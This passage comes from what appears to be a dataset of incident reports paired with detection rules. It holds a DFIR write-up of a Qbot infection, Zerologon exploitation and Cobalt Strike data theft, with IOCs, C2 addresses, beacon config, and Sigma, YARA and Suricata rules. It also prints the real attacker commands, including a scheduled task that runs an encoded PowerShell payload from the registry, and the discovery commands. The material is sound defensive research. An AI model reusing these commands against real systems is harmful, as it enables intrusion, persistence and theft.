c35a61411ee5bdf666b4d64b05c29e64\nJA3s: 7c02dbae662670040c7af9bd15fb7e2f\n```\n\n41.228.22[.]180:443 / xrhm[.]info\n\n```\nCertificate:\t96:39:a9:52:e9:9a:1e:29:c5:dc:b3:72:01:29:74:c4:87:db:15:d7\nNot \tBefore:  2021/11/12 04:34:10 UTC\nNot After:  \t2022/11/12 10:08:57 UTC\nIssuer Org:  Bqatra Bamito Inc.\nSubject Common:  xrhm[.]info\nPublic Algorithm:  rsaEncryption\nJA3:  c35a61411ee5bdf666b4d64b05c29e64\nJA3s: 7c02dbae662670040c7af9bd15fb7e2f\n```\n\nHere is the initial access DLL (Qbot) information from Tria.ge\n\n```image\nAlt: Qbot DLL\nDescription: The image displays a table containing details about Qakbot (QBot) operations. It includes columns for Family, Version, Botnet, Campaign, and a list of Command and Control (C2) IP addresses with their corresponding ports. Each row represents a different C2 address associated with Qakbot, showcasing the botnet's operational infrastructure.\nTranscription: |\n  Family: qakbot\n  Version: 402.363\n  Botnet: tr\n  Campaign: 1633597626\n  \n  C2:\n  120.150.218.241:995\n  89.137.52.44:443\n  86.8.177.143:443\n  174.54.139.186:443\n  188.50.169.158:443\n  140.82.49.12:443\n  81.241.252.59:2078\n  209.50.20.255:443\n  200.232.214.222:995\n  2.222.167.138:443\n  122.11.220.212:2222\n  47.22.148.6:443\n  217.17.56.163:465\n  94.200.181.154:443\n  201.93.111.2:995\n  89.101.97.139:443\n  188.55.235.118:995\n  181.118.183.94:443\n  186.32.163.199:443\n  76.25.142.196:443\n  98.157.235.126:443\n  73.151.236.31:443\n  75.75.179.226:443\n  67.165.206.193:993\n  72.252.201.69:443\n  185.250.148.74:443\n  66.103.170.104:2222\n  216.201.162.158:443\n  103.123.42.115:2222\n  124.123.42.115:2222\n  199.27.127.129:443\n  209.142.97.161:995\n  73.236.205.91:443\n  103.142.10.177:443\n  41.228.22.180:443\n  78.191.58.219:995\n  74.72.237.54:443\n  96.57.188.174:2078\n  37.210.152.224:995\n  202.134.178.157:443\n  73.52.50.32:443\n  27.223.92.142:995\n  136.236.74.70:443\n  72.173.78.211:443\n  45.46.53.140:2222\n  173.21.10.71:2222\n  71.74.12.34:443\n  167.48.117.81:443\n  47.40.196.233:2222\n  181.4.53.6:465\n```\n\n#### Cobalt Strike details – 5.255.98[.]144\n\nThis Cobalt Strike server was added to our Threat Feed on 2021-11-16.\n\n5.255.98.144:8888 / 5.255.98.144:443 / 5.255.98.144:8080 / dxabt[.]com\n\n```\nCertificate: [25:fe:be:6d:0e:8d:48:5a:94:cf:46:84:d7:7e:ff:bf:47:aa:04:5c ]\nNot Before: 2021/11/07 03:00:53 UTC  \t\nNot After: 2022/02/05 03:00:52 UTC  \t\nIssuer Org: Let's Encrypt  \t\nSubject Common: dxabt[.]com [dxabt[.]com,ns1.dxabt[.]com,ns2.dxabt[.]com,ns3.dxabt[.]com,ns4.dxabt[.]com\nPublic Algorithm: rsaEncryption\nJA3: 0eecb7b1551fba4ec03851810d31743f\nJA3s: ae4edc6faf64d08308082ad26be60767\n```\n\nConfig:\n\n```\n{\n    \"x64\": {\n        \"uri_queried\": \"/tRPG\",\n        \"sha256\": \"dec25fc2fe7e76fe191fbfdf48588c4325f52bfe2769fbc88a5614541c1075eb\",\n        \"config\": {\n            \"HTTP Method Path 2\": \"/faq\",\n            \"Jitter\": 79,\n            \"C2 Server\": \"dxabt[.]com,/case\",\n            \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\",\n            \"Method 1\": \"GET\",\n            \"C2 Host Header\": \"\",\n            \"Method 2\": \"POST\",\n            \"Watermark\": 426352781,\n            \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\",\n            \"Beacon Type\": \"8 (HTTPS)\",\n            \"Port\": 443,\n            \"Polling\": 53988\n        },\n        \"time\": 1637416040175.3,\n        \"md5\": \"30cc71d5b5d7778774c54486558690d3\",\n        \"sha1\": \"5f36c6cffdbae0d631c8889b4d9bad1248f899b3\"\n    },\n    \"x86\": {\n        \"uri_queried\": \"/Mr0m\",\n        \"sha256\": \"a992d57b2f6164e599952ea3c245962824ad17166684ed45e987efe80ebe611f\",\n        \"config\": {\n            \"HTTP Method Path 2\": \"/faq\",\n            \"Jitter\": 79,\n            \"C2 Server\": \"dxabt[.]com,/case\",\n            \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\",\n            \"Method 1\": \"GET\",\n            \"C2 Host Header\": \"\",\n            \"Method 2\": \"POST\",\n            \"Watermark\": 426352781,\n            \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\",\n            \"Beacon Type\": \"8 (HTTPS)\",\n            \"Port\": 443,\n            \"Polling\": 53988\n        },\n        \"time\": 1637416038974.9,\n        \"md5\": \"c1fd49c043894c1dff8bc02b17f8942c\",\n        \"sha1\": \"e915f74be310b1687db6b290af2f78583a981512\"\n    }\n}\n```\n\n### Exfiltration\n\nWhile the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165. These alerts tell us that data was indeed exfiltrated from the environment.\n\n```image\nAlt: Canary Documents\nDescription: The image displays a code snippet featuring details about an IP address (91.193.182.165). It includes information such as city (Moscow), region (Moscow), country (RU), geographical coordinates, organization (AS12722 RECONN LLC), postal code (101000), and timezone (Europe/Moscow). This data is relevant for identifying the origin of suspicious activities in a cybersecurity context.\nTranscription: |\n  ip: \"91.193.182.165\"\n  city: \"Moscow\"\n  region: \"Moscow\"\n  country: \"RU\"\n  loc: \"55.7522,37.6156\"\n  org: \"AS12722 RECONN LLC\"\n  postal: \"101000\"\n  timezone: \"Europe/Moscow\"\n```\n\nThe threat actors were most interested in files concerning financial statements, ransomware reports, and salary data.\n\nThe C2 channel was encrypted and multiple connections were established with the internal file server. No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration.\n\n```image\nAlt: C2 Channel\nDescription: The image is a bar graph depicting the number of connections per minute from a File Server to a specified command and control IP address (5.255.98.144:8888). The x-axis represents time in UTC from 17:35 to 18:15, while the y-axis indicates the number of connections, ranging from 0 to 20. The graph shows a notable spike in connections at 17:54, which aligns with the timeframe of suspected data exfiltration, demonstrating the activity of a Cobalt Strike Beacon during that period.\nTranscription: |\n  Number of connection to 5.255.98.144:8888 from File Server per minute\n  \n  | Time  | Connections |\n  |-------|-------------|\n  | 17:36 | 1           |\n  | 17:37 | 0           |\n  | 17:38 | 0           |\n  | 17:39 | 5           |\n  | 17:40 | 0           |\n  | 17:41 | 0           |\n  | 17:42 | 0           |\n  | 17:43 | 0           |\n  | 17:44 | 0           |\n  | 17:45 | 0           |\n  | 17:46 | 0           |\n  | 17:47 | 0           |\n  | 17:48 | 0           |\n  | 17:49 | 0           |\n  | 17:50 | 0           |\n  | 17:51 | 0           |\n  | 17:52 | 0           |\n  | 17:53 | 0           |\n  | 17:54 | 18          |\n  | 17:55 | 16          |\n  | 17:56 | 14          |\n  | 17:57 | 12          |\n  | 17:58 | 10          |\n  | 17:59 | 10          |\n  | 18:00 | 10          |\n  | 18:01 | 10          |\n  | 18:02 | 10          |\n  | 18:03 | 10          |\n  | 18:04 | 10          |\n  | 18:05 | 10          |\n  | 18:06 | 10          |\n  | 18:07 | 10          |\n  | 18:08 | 10          |\n  | 18:09 | 10          |\n  | 18:10 | 10          |\n  | 18:11 | 10          |\n  | 18:12 | 10          |\n```\n\nAt 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server.\n\nAccording to the number of connections to the C2 from the File Server per minute, we can conclude that exfiltration was done between 17:52 UTC and 18:00 UTC.\n\n```image\nAlt: Exfiltration Traffic\nDescription: The image is a time series graph displaying network traffic data related to exfiltration events. The x-axis represents time in UTC, ranging from 17:52:00 to 18:00:00, while the y-axis indicates the volume of data transferred. A significant spike is visible around 17:54:00, indicating a peak in traffic from the file share server to the Cobalt Strike command and control server. The graph uses red bars to highlight the data transfer volumes, suggesting a concentrated effort of data exfiltration occurring within this time frame.\nTranscription: |\n  | Time (UTC) | Connections |\n  |------------|-------------|\n  | 17:52:00   | Low         |\n  | 17:54:00   | High        |\n  | 17:56:00   | Low         |\n  | 17:58:00   | Low         |\n  | 18:00:00   | Low         |\n```\n\nSpike in traffic from file share server to Cobalt Strike command and control server.\n\n### IOCs\n\n#### Network\n\n```\nQBOT\n24.229.150[.]54:995  - avlhestito[.]us\n41.228.22[.]180:443 - xrhm[.]info\n\nCobalt Strike\n5.255.98[.]144:8888 / dxabt[.]com\n5.255.98[.]144:443 / dxabt[.]com\n5.255.98[.]144:8080 / dxabt[.]com\n```\n\n#### File\n\n```\nIntial Exec Qbot DLL\nMD5:53510e20efb161d5b71c4ce2800c1a8d\nSHA1:2268178851d0d0debb9ab457d73af8a5e50af168\nSHA2:e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\n\nQBot DLL (extracted from registry):\nMD5:312e52b4109741893f17bc524084100f\nSHA1:7ca650945223eab088f43fd472e3592be2ed9d32\nSHA2:4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b\n\ncool.exe\nMD5:59E7F22D2C290336826700F05531BD30\nSHA1:3B2A0D2CB8993764A042E8E6A89CBBF8A29D47D1\nSHA256:F63E17FF2D3CFE75CF3BB9CF644A2A00E50AAFFE45C1ADF2DE02D5BD0AE35B0\n```\n\n## Detections\n\n### Network\n\n```\nET POLICY Powershell Activity Over SMB - Likely Lateral Movement\nET POLICY Command Shell Activity Using Comspec Environmental Variable Over SMB - Very Likely Lateral Movement\nET RPC DCERPC SVCCTL - Remote Service Control Manager Access\nET CNC Feodo Tracker Reported CnC Server group 15\nET CNC Feodo Tracker Reported CnC Server group 16\n\nThe following rules may cause performance issues (and are disabled by default) according to @ET_Labs\nET EXPLOIT Possible Zerologon NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472) - 2030870\nET EXPLOIT Possible Zerologon NetrServerAuthenticate with 0x00 Client Credentials (CVE-2020-1472) 2030871\nET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) UUID flowbit set - 2030888\nET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) M2 - 2030889\n```\n\nNew signatures\n\n```\n2035258 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1\n2035259 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2\n2035260 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1\n2035261 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2\n2035262 - ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472)\n2035263 - ET EXPLOIT Zerologon Phase 3/3 - NetrLogonSamLogonWithFlags Request with 0x00 Client Credentials (CVE-2020-1472)\n```\n\n### Sigma\n\n```\ntitle: Scheduled task executing powershell encoded payload from registry\nstatus: Experimental\ndescription: Detects the creation of a schtask that executes a base64 encoded payload stored in the Windows Registry using PowerShell.\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    Image|endswith: '\\schtasks.exe'\n    CommandLine|contains|all:\n      - '/Create'\n      - '/SC'\n  selection2:\n    CommandLine|contains|all:\n      - 'FromBase64String'\n      - 'powershell'\n      - 'Get-ItemProperty'\n      - 'HKCU:'\n  condition: selection1 and selection2\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.t1053.005\n  - attack.t1059.001\n```\n\n```\ntitle: Execution of ZeroLogon PoC executable\nstatus: Experimental\ndescription: Detects the execution of the commonly used ZeroLogon PoC executable.\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    ParentImage|endswith:\n      - '\\cmd.exe'\n    Image|endswith:\n      - '\\cool.exe'\n      - '\\zero.exe'\n    CommandLine|contains|all:\n      - 'Administrator'\n      - '-c'\n  selection2:\n    CommandLine|contains|all:\n      - 'taskkill'\n      - '/f'\n      - '/im'\n  selection3:\n    CommandLine|contains:\n      - 'powershell'\n  condition: selection1 and (selection2 or selection3)\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.execution\n  - attack.lateral_movement\n  - attack.T1210\n```\n\n```\ntitle:  Enabling RDP service via reg.exe command execution\nstatus: Experimental\ndescription: Detects the execution of reg.exe and subsequent command line arguments for enabling RDP service on the host\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    Image|endswith:\n      - '\\reg.exe'\n    CommandLine|contains|all:\n      - 'add'\n      - 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server'\n      - 'REG_DWORD'\n  Winstations1:\n    CommandLine|contains:\n      - 'WinStations\\RDP-Tcp'\n  Winstations2:\n    CommandLine|contains:\n      - 'MaxInstanceCount'\n      - 'fEnableWinStation'\n  selection2:\n    CommandLine|contains|all:\n      - 'Licensing Core'\n      - 'EnableConcurrentSessions'\n  selection3:\n    CommandLine|contains:\n      - 'TSUserEnabled'\n      - 'TSEnabled'\n      - 'TSAppCompat'\n      - 'IdleWinStationPoolCount'\n      - 'TSAdvertise'\n      - 'AllowTSConnections'\n      - 'fSingleSessionPerUser'\n  condition: selection1 and ((Winstations1 and Winstations2) or (selection2 or selection3))\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.defense_evasion\n  - attack.lateral_movement\n  - attack.t1021.001\n  - attack.t1112\n```\n\n- https://github.com/SigmaHQ/sigma/blob/a502f316efdcc8c174b7cf412029dfae5b3552c8/rules/windows/builtin/security/win_pass_the_hash_2.yml\n- https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_powershell_as_service.yml\n- https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_cobaltstrike_service_installs.yml\n- https://github.com/SigmaHQ/sigma/blob/33b370d49bd6aed85bd23827aa16a50bd06d691a/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_nltest_recon.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_susp_whoami.yml\n\n### Yara\n\n```\n/*\n   YARA Rule Set\n   Author: The DFIR Report\n   Date: 2022-02-20\n   Identifier: Case 8734\n   Reference: https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\nrule qbot_8734_payload_dll {\n   meta:\n      description = \"files - file e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\"\n      author = \"The DFIR Report\"\n      reference = \"https://thedfirreport.com\"\n      date = \"2022-02-20\"\n      hash1 = \"e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\"\n   strings:\n      $s1 = \"Terfrtghygine.dll\" fullword ascii\n      $s2 = \"Winamp can read extended metadata for titles. Choose when this happens:\" fullword wide /* Goodware String - occured 1 times */\n      $s3 = \"Read metadata when file(s) are loaded into Winamp\" fullword wide /* Goodware String - occured 1 times */\n      $s4 = \"Use advanced title formatting when possible\" fullword wide /* Goodware String - occured 1 times */\n      $s5 = \"PQVW=!?\" fullword ascii\n      $s6 = \"Show underscores in titles as spaces\" fullword wide /* Goodware String - occured 1 times */\n      $s7 = \"Advanced title display format :\" fullword wide /* Goodware String - occured 1 times */\n      $s8 = \"CreatePaint\" fullword ascii\n      $s9 = \"PQRVW=2\\\"\" fullword ascii\n      $s10 = \"Advanced Title Formatting\" fullword wide /* Goodware String - occured 1 times */\n      $s11 = \"Read metadata when file(s) are played or viewed in the playlist editor\" fullword wide /* Goodware String - occured 1 times */\n      $s12 = \"Show '%20's in titles as spaces\" fullword wide /* Goodware String - occured 1 times */\n      $s13 = \"Example : \\\"%artist% - %title%\\\"\" fullword wide /* Goodware String - occured 1 times */\n      $s14 = \"PQRVW=g\" fullword ascii\n      $s15 = \"PQRW=e!\" fullword ascii\n      $s16 = \"ATF Help\" fullword wide /* Goodware String - occured 1 times */\n      $s17 = \"(this can be slow if a large number of files are added at once)\" fullword wide /* Goodware String - occured 1 times */\n      $s18 = \"PQRVW=$\" fullword ascii\n      $s19 = \"Metadata Reading\" fullword wide /* Goodware String - occured 1 times */\n      $s20 = \"Other field names: %artist%, %album%, %title%, %track%, %year%, %genre%, %comment%, %filename%, %disc%, %rating%, ...\" fullword wide /* Goodware String - occured 1 times */\n   condition:\n      uint16(0) == 0x5a4d and filesize < 2000KB and\n      ( pe.imphash() == \"aa8a9db10fba890f8ef9edac427eab82\" and pe.exports(\"CreatePaint\") or 8 of them )\n}\n\nrule qbot_dll_8734 {\n   meta:\n      description = \"files - qbot.dll\"\n      author = \"TheDFIRReport\"\n      reference = \"QBOT_DLL\"\n      date = \"2021-12-04\"\n      hash1 = \"4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b\"\n   strings:\n      $s1 = \"Execute not supported: %sfField '%s' is not the correct type of calculated field to be used in an aggregate, use an internalcalc\" wide\n      $s2 = \"IDAPI32.DLL\" fullword ascii\n      $s3 = \"ResetUsageDataActnExecute\" fullword ascii\n      $s4 = \"idapi32.DLL\" fullword ascii\n      $s5 = \"ShowHintsActnExecute\" fullword ascii\n      $s6 = \"OnExecute@iG\" fullword ascii\n      $s7 = \"OnExecutexnD\" fullword ascii\n      $s8 = \"ShowShortCutsInTipsActnExecute\" fullword ascii\n      $s9 = \"ResetActnExecute \" fullword ascii\n      $s10 = \"RecentlyUsedActnExecute\" fullword ascii\n      $s11 = \"LargeIconsActnExecute\" fullword ascii\n      $s12 = \"ResetActnExecute\" fullword ascii\n      $s13 = \"OnExecute<\" fullword ascii\n      $s14 = \"TLOGINDIALOG\" fullword wide\n      $s15 = \"%s%s:\\\"%s\\\";\" fullword ascii\n      $s16 = \":\\\":&:7:?:C:\\\\:\" fullword ascii /* hex encoded string '|' */\n      $s17 = \"LoginPrompt\" fullword ascii\n      $s18 = \"TLoginDialog\" fullword ascii\n      $s19 = \"OnLogin\" fullword ascii\n      $s20 = \"Database Login\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 3000KB and\n      8 of the\n```\n\n## MITRE\n\n- Exploitation for Privilege Escalation – T1068\n- Service Execution – T1569.002\n- Network Share Discovery – T1135\n- Pass the Hash – T1550.002\n- PowerShell – T1059.001\n- Windows Command Shell – T1059.003\n- Network Share Discovery – T1135\n- Obfuscated Files or Information – T1027\n- Scheduled Task – T1053.005\n- Process Injection – T1055\n- Remote System Discovery – T1018\n- Obfuscated Files or Information – T1027\n- Domain Trust Discovery – T1482\n- Domain Groups – T1069.002\n- System Owner/User Discovery – T1033\n- Network Share Discovery – T1135\n- Remote Services – T1021\n- Local Account – T1087.001\n- Security Software Discovery – T1518.001\n\n```image\nAlt: MITRE ATT&CK\nDescription: The image is a flowchart detailing the relationships and tactics used in a cyber attack scenario involving Qbot and Zerologon. It is structured according to the MITRE ATT&CK framework, illustrating various tactics and techniques such as initial access, execution, privilege escalation, lateral movement, discovery, command and control, and exfiltration. Each tactic is accompanied by specific techniques and associated tools, such as Cobalt Strike, PowerShell, and others. The flowchart visually organizes these components, highlighting how they connect to lead to a full domain compromise.\nTranscription: |\n  TA0001: Initial Access\n      T1566.001: Phishing: Spearphishing Attachment -> Qbot\n  \n  TA0002: Execution\n      T1059.001: Command and Scripting Interpreter: PowerShell\n      T1059.003: Command and Scripting Interpreter: Windows Command Shell -> Cobalt Strike\n      T1569: System Services\n  \n  TA0004: Privilege Escalation\n      T1078.002: Valid Accounts: Domain Accounts\n      T1086: Exploitation for Privilege Escalation -> Zerologon\n  \n  TA0005: Defense Evasion\n      T1055: Process Injection -> Cobalt Strike\n  \n  TA0003: Persistence\n      T1053.005: Scheduled Task/Job: Scheduled Task\n  \n  TA0008: Lateral Movement\n      T1021.002: Remote Services: SMB/Windows Admin Shares -> Cobalt Strike\n      T1021.001: Remote Services: Remote Desktop Protocol\n  \n  TA0007: Discovery\n      T1518.001: Software Discovery: Security Software Discovery -> wmic\n      T1018: Remote System Discovery -> Ping\n      T1087.002: Account Discovery: Domain Account -> ADFind\n      T1135: Network Share Discovery -> Net View\n      T1069.001: Permission Groups Discovery: Local Groups\n      T1069: Permission Groups Discovery: Domain Groups -> Net Group\n      T1482: Domain Trust Discovery -> Ntest\n  \n  TA0011: Command and Control\n      T1071: Application Layer Protocol -> Cobalt Strike and Qbot\n  \n  TA0010: Exfiltration\n      T1041: Exfiltration over C2 Channel -> Documents from File Share Server and Cobalt Strike\n```",
    "sigma_rule": {
      "title": "Suspicious Scheduled Task Name As GUID",
      "id": "ff2fff64-4cd6-4a2b-ba7d-e28a30bbe66b",
      "status": "test",
      "description": "Detects creation of a scheduled task with a GUID like name",
      "references": [
        "https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/",
        "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-31",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains": "/Create "
        },
        "selection_tn": {
          "CommandLine|contains": [
            "/TN \"{",
            "/TN '{",
            "/TN {"
          ]
        },
        "selection_end": {
          "CommandLine|contains": [
            "}\"",
            "}'",
            "} "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate software naming their tasks as GUIDs"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_guid_task_name.yml",
    "id": "479"
  },
  {
    "url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/",
    "markdown": "# Qbot and Zerologon Lead To Full Domain Compromise\n\n**Categories:** adfind, cobaltstrike, Qbot\n\n**Published on:** February 21, 2022\n\nIn this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of Qbot (a.k.a. Quakbot/Qakbot) malware.\n\nSoon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat actor then exfiltrated sensitive documents from the environment before being evicted from the network.\n\n### Summary\n\nThe threat actors gained initial access to a Windows workstation through the execution of a malicious DLL. The first activity of QBot was seen 5 minutes after the DLL was executed. Various automated discovery commands were used to map the network topology, retrieve local group member information, and list available file shares/privileges of the infected user.\n\nFollowing the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence. The scheduled task’s primary purpose was to execute a (base64-encoded) PowerShell Cobalt Strike beacon every 30 minutes.\n\nOnce the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as `Nltest`, `net`, and `ADFind`.\n\nUpon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability. The executable used bears striking similarity to the one used in a previous case From Zero to Domain Admin based on command line arguments and the overall execution of the exploit. The executable named `cool.exe` resets the domain controller password to an empty string, retrieves the Domain Admin password Hash, and installs a service on the DC to reset the DC password so as to not break Active Directory operations.\n\nThe domain admin hash was then used on the beachhead through an over-pass-the-hash attack. After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers.\n\nFinally, documents were stolen and exfiltrated through Cobalt Strike encrypted C2 channel (HTTPS). To conclude this case, the threat actors were evicted from the network before they completed any further objectives.\n\n### Services\n\nWe offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as QBot, Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nWe also have artifacts and IOCs available from this case such as memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n### Timeline\n\n```image\nAlt: Qbot and Zerologon Lead To Full Domain Compromise\nDescription: The image is a detailed timeline chart illustrating the sequence of events related to Qbot and Zerologon vulnerabilities leading to a full domain compromise. It outlines specific timestamps and activities, such as the execution of Qbot DLL, Cobalt Strike discovery, and various network and service interactions. The chart includes commands and actions taken during the attack, making it a comprehensive reference for understanding the progression of the compromise.\nTranscription: |\n  Qbot and Zerologon Lead To Full Domain Compromise\n  \n  16:31 UTC Initial Qbot DLL execution on Beachhead\n      rundll32.exe C:\\Users\\[REDACTED] e2bc6949442adc97345ac811d345f68a386 2laad3c7ae2740a8fa582987.dll,#1\n  \n  16:37 First Qbot C2 activity and discovery activity\n      net localgroup, net share, net view /all, netstat -nao, rout print, ...\n  \n  16:40 DLL dropped by Qbot\n  \n  16:40 Scheduled task created for persistence\n      base64 encoded PowerShell script executed every 30 minutes\n  \n  16:46 C2 begins - Cobalt Strike\n      5.255.98.144:8888\n      dxabt.com\n  \n  17:00 Cobalt Strike discovery\n      nltest.exe /domain_trusts\n      nltest.exe /all_trusts\n      net group \"domain admins\" /domain\n      net group \"domain controllers\" /domain\n      ping -n 1 DOMAINCONTROLLER\n  \n  17:03 ZeroLogon exploit on the first Domain Controller\n      Password of DC was changed\n      Service was installed on the DC\n  \n  17:10 Cobalt Strike Beacon via service installation on the Domain Controller\n  \n  17:12 ADFind discovery from Beachhead\n      find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n  \n  17:12 Over-Pass-The-Hash performed with DA hash on Beachhead\n  \n  17:15 Cobalt Strike Beacon via service installation on another Domain Controller\n  \n  17:31 Security software discovery + Ping + ADFind on the second Domain Controller\n      cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /Value\n      cmd.exe /C C:\\[REDACTED]\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > C:\\[REDACTED]\\ce.csv\n      cmd.exe /C ping -n 1 SERVER\n  \n  17:35 UTC Cobalt Strike Beacon via service installation on a file server\n  \n  17:37 UTC RDP connection from BeachHead to Domain Controller and a file server\n  \n  17:56 UTC Alerts triggered from canary document indicating open from Host at IP 91.192.182.[*]165\n```\n\n### Initial Access\n\nThe threat actor gained their initial access through the execution of a malicious DLL. Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL. In this case, however, the execution started directly from the qbot DLL found here.\n\nThe execution chain for this QBot infection can be seen below:\n\n```image\nAlt: Qbot Chain\nDescription: The image depicts a detailed execution chain for a Qbot infection. It outlines the steps taken by the malware, starting with the execution of a malicious DLL via 'rundll32.exe'. It shows the injection process into 'explorer.exe' and subsequent connections to two IP addresses, along with the execution of various discovery commands. The steps are categorized into Execution, Discovery, Defense Evasion, and Command and Control, with a legend indicating the color-coding for each category. The image provides specific command line instructions and paths used during the infection process.\nTranscription: |\n  rundll32.exe C:\\Users\\<redacted>\\Downloads\\e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987.dll, #1\n  \n  1. starts & injects into:\n     - C:\\Windows\\SysWOW64\\explorer.exe\n  \n  2. connects to:\n     - 41.228.22.180:443\n     - 24.229.150.54:995\n  \n  3. Runs discovery commands:\n     - whoami /all\n     - net view /all\n     - netstat -ano\n     - cmd /c set\n     - net share\n     - net localgroup\n     - ipconfig /all\n     - route print\n     - arp -a\n     - nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.<redacted>\n  \n  4. Executes:\n     - regsvr32.exe -s \"C:\\Users\\<redacted>\\AppData\\Roaming\\Microsoft\\Fdopitcu\\qwkrfxkgymyv.dll\"\n     - schtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa)))\" /SC MINUTE /MO 30\n```\n\n### Execution\n\n#### QBot PowerShell analysis\n\nWe analyzed the registry path and associated keys that were queried by the scheduled task `HKCU:\\SOFTWARE\\Pvoeooxf` and discovered that three keys were created containing base64 encoded values. Decoding the values resulted in:\n\n1. Copy of QBot DLL\n2. String of QBot C2 IP-addresses separated by a semicolon.\n3. Obfuscated PowerShell script that is referenced by the scheduled task.\n\n```image\nAlt: PowerShell 